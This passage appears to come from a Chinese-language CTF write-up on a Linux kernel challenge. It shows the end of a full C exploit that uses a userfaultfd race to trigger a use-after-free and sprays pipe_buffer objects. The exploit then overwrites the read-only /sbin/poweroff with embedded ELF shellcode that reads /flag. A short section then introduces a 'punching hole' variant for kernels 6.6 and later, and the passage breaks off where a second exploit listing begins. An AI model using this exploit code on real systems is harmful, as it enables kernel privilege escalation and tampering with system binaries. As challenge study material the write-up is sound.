class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* bind the process to specific core */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">int</span> core)</span>&#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pushf;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pop user_rflags;&quot;</span></span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">char</span> v14[<span class="number">0x100</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Begin add.&quot;</span>);</span><br><span class="line">    vuln.e = (<span class="type">size_t</span>)v14;</span><br><span class="line">    <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">        <span class="type">int</span> result = ioctl(fd, <span class="number">0xFFF0</span>, &amp;vuln);</span><br><span class="line">        <span class="keyword">if</span>(result != <span class="number">-1</span>)&#123;</span><br><span class="line">            info(<span class="string">&quot;Add success.&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">del</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Begin delete&quot;</span>);</span><br><span class="line">    vuln.e = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">        <span class="type">int</span> result = ioctl(fd, <span class="number">0xFFF1</span>, &amp;vuln);</span><br><span class="line">        <span class="keyword">if</span>(result != <span class="number">-1</span>)&#123;</span><br><span class="line">            info(<span class="string">&quot;Delete success.&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> uffd_buf[<span class="number">0x200</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">register_userfaultfd</span><span class="params">(<span class="type">void</span>* uffd_buf, <span class="type">pthread_t</span> pthread_moniter, <span class="type">void</span>* handler)</span>&#123;</span><br><span class="line">    <span class="type">int</span> uffd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line"> </span><br><span class="line">    uffd = syscall(__NR_userfaultfd, O_NONBLOCK|O_CLOEXEC);</span><br><span class="line">    <span class="keyword">if</span> (uffd == <span class="number">-1</span>) err_exit(<span class="string">&quot;syscall for userfaultfd ERROR in register_userfaultfd func&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    uffdio_api.api = UFFD_API;</span><br><span class="line">    uffdio_api.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>) err_exit(<span class="string">&quot;ioctl for UFFDIO_API ERROR&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    uffdio_register.range.start = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)uffd_buf;</span><br><span class="line">    uffdio_register.range.len = <span class="number">0x1000</span>;</span><br><span class="line">    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="number">-1</span>) err_exit(<span class="string">&quot;ioctl for UFFDIO_REGISTER ERROR&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="type">int</span> res = pthread_create(&amp;pthread_moniter, <span class="literal">NULL</span>, handler, uffd);</span><br><span class="line">    <span class="keyword">if</span> (res == <span class="number">-1</span>) err_exit(<span class="string">&quot;pthread_create ERROR in register_userfaultfd func&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hijack_handler</span><span class="params">(<span class="type">void</span> *args)</span>&#123;</span><br><span class="line">    <span class="type">int</span> uffd = (<span class="type">int</span>)args;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;)&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        <span class="keyword">if</span> (poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;Failed to exec poll for leak_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> res = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">        <span class="keyword">if</span> (res == <span class="number">0</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;EOF on userfaultfd for leak_handler&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (res == <span class="number">-1</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;ERROR on userfaultfd for leak_handler&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">            err_exit(<span class="string">&quot;INCORRET EVENT in leak_handler&quot;</span>);</span><br><span class="line">        <span class="comment">// operation</span></span><br><span class="line">        info(<span class="string">&quot;hijack the kernel in userfaultfd -- hijack_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] trigger uaf\n&quot;</span>);</span><br><span class="line">        del();</span><br><span class="line">        </span><br><span class="line">        sleep(<span class="number">3</span>);</span><br><span class="line">        spray_pipes(<span class="number">0</span>, MAX_PIPE_COUNT);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAX_PIPE_COUNT; ++i) &#123;</span><br><span class="line">            <span class="type">uint32_t</span> k = i;</span><br><span class="line">            write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;writesth&quot;</span>, <span class="number">8</span>);</span><br><span class="line">            write(pipe_fd[i][<span class="number">1</span>], &amp;k, <span class="keyword">sizeof</span>(<span class="type">uint32_t</span>));</span><br><span class="line">            write(pipe_fd[i][<span class="number">1</span>], &amp;k, <span class="keyword">sizeof</span>(<span class="type">uint32_t</span>));</span><br><span class="line">            write(pipe_fd[i][<span class="number">1</span>], &amp;k, <span class="keyword">sizeof</span>(<span class="type">uint32_t</span>));</span><br><span class="line">            write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;Qanux&quot;</span>, <span class="number">8</span>);</span><br><span class="line">            write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;Qanux&quot;</span>, <span class="number">8</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span> tmp[<span class="number">0x10</span>];</span><br><span class="line"></span><br><span class="line">        uffd_buf[<span class="number">0</span>] = <span class="number">0xe180</span>;</span><br><span class="line"></span><br><span class="line">        uffdio_copy.src = uffd_buf;</span><br><span class="line">        uffdio_copy.dst = (<span class="type">unsigned</span> <span class="type">long</span>)msg.arg.pagefault.address &amp; ~(<span class="number">0x1000</span> - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = <span class="number">0x1000</span>;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;Failed to exec ioctl for UFFDIO_COPY in leak_handler&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[] = &#123;</span><br><span class="line">    <span class="number">0x7f</span>, <span class="number">0x45</span>, <span class="number">0x4c</span>, <span class="number">0x46</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3e</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x78</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x38</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x97</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x97</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0xbf</span>, <span class="number">0x2f</span>, <span class="number">0x66</span>, <span class="number">0x6c</span>, <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x57</span>, <span class="number">0x48</span>,</span><br><span class="line">    <span class="number">0x89</span>, <span class="number">0xe7</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xf6</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xd2</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xc0</span>, <span class="number">0x02</span>,</span><br><span class="line">    <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0x89</span>, <span class="number">0xc7</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe6</span>, <span class="number">0x48</span>, <span class="number">0xc7</span>, <span class="number">0xc2</span>, <span class="number">0x00</span>, <span class="number">0x01</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0xb8</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xbf</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0x00</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv, <span class="type">char</span>** env)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> data[<span class="number">0x200</span>];</span><br><span class="line"></span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/ksctf&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;open device failed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    vuln.msg = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">    <span class="built_in">memset</span>(vuln.msg, <span class="string">&#x27;\x00&#x27;</span>, <span class="number">0x30</span>);</span><br><span class="line"></span><br><span class="line">    add();</span><br><span class="line"></span><br><span class="line">    <span class="type">pthread_t</span> pwn;</span><br><span class="line">    <span class="type">char</span> *uffd_buf_hijack = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    register_userfaultfd(uffd_buf_hijack, &amp;pwn, hijack_handler);</span><br><span class="line"></span><br><span class="line">    write(fd,uffd_buf_hijack,<span class="number">0x2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// try to find corrupted pipe_buf</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] finding corrupted page\n&quot;</span>);</span><br><span class="line">    <span class="type">int</span> corrupted_index = <span class="number">-1</span>, pointed_index = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAX_PIPE_COUNT; ++i) &#123;</span><br><span class="line">        already_read[i] = <span class="number">1</span>;</span><br><span class="line">        <span class="type">uint32_t</span> k = <span class="number">0</span>;</span><br><span class="line">        <span class="type">char</span> p_buf[<span class="number">0x10</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        <span class="built_in">memset</span>(p_buf, <span class="number">0</span>, <span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">        read(pipe_fd[i][<span class="number">0</span>], p_buf, <span class="number">8</span>);</span><br><span class="line">        read(pipe_fd[i][<span class="number">0</span>], &amp;k, <span class="keyword">sizeof</span>(<span class="type">uint32_t</span>));</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (k != i) &#123;</span><br><span class="line">            corrupted_index = i;</span><br><span class="line">            pointed_index = k;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] found %d=&gt;%d pipe data: %p\n&quot;</span>, i, k, *(<span class="type">uint64_t</span> *)p_buf);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        usleep(<span class="number">1000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (corrupted_index == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] failed to find corrupted page\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *alloc_buf = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(alloc_buf, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    write(pipe_fd[pointed_index][<span class="number">1</span>], alloc_buf, <span class="number">0x20</span>);</span><br><span class="line">    close(pipe_fd[corrupted_index][<span class="number">0</span>]);</span><br><span class="line">    close(pipe_fd[corrupted_index][<span class="number">1</span>]);</span><br><span class="line">    <span class="type">int</span> passwd_fd[<span class="number">0x200</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x200</span>; i++)&#123;</span><br><span class="line">        passwd_fd[i] = open(<span class="string">&quot;/sbin/poweroff&quot;</span>, O_RDONLY);</span><br><span class="line">        <span class="keyword">if</span>(passwd_fd[i] &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            err_exit(<span class="string">&quot;open file.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="type">size_t</span> tmp = <span class="number">0x480e801f</span>;</span><br><span class="line">    write(pipe_fd[pointed_index][<span class="number">1</span>], &amp;tmp, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x200</span>; i++)&#123;</span><br><span class="line">        <span class="type">int</span> retval = write(passwd_fd[i], shellcode, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line">        <span class="keyword">if</span>(retval &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;write file success.&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x200</span>; i++)&#123;</span><br><span class="line">        close(passwd_fd[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] EXP END.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="求解效果-2"><a href="#求解效果-2" class="headerlink" title="求解效果"></a>求解效果</h3><img src="/2024/10/07/kno_puts/12.png" class="" title="我的图图呢">  <h2 id="punching-hole-pipe-buffer-page-UAF"><a href="#punching-hole-pipe-buffer-page-UAF" class="headerlink" title="punching hole + pipe_buffer  + page UAF"></a><font style="color:rgb(52, 73, 94);">punching hole</font> + pipe_buffer  + page UAF</h2><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>这里我们对题目再进行最后一次升级，我们假设 <code>kernel</code> 版本为 <code>6.6+</code>，这个时候 <code>userfaultfd</code> 就只运行特权用户使用了。也许我们会想到用 <code>fuse</code>，可是在 <code>kernel pwn</code> 这种环境残缺的情况很难使用，这个时候我们就可以使用 <code>puching hole</code>。这个打法笔者是第一次听，网上也找不到什么资料，最后也是请教 Csome 师兄和 cnitlrt 师傅。大致意思就是把线程丢到一个等待队列，令一个线程休眠，其触发条件和 <code>userfaultfd</code> 一样也是通过 <code>copy</code> 类函数触发。将 <code>userfaultfd</code> 改用 <code>punching hole</code> 后其余操作和上面那个 <code>exp</code> 一致，不过由于使用了 <font style="color:rgb(52, 73, 94);"><code>punching hole</code> 后堆的布局有了点变化，所以我 <code>pipe_buffer</code> 在堆块 <code>uaf</code> 的前面和后面各喷了一次以来提高命中率。</font></p><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span 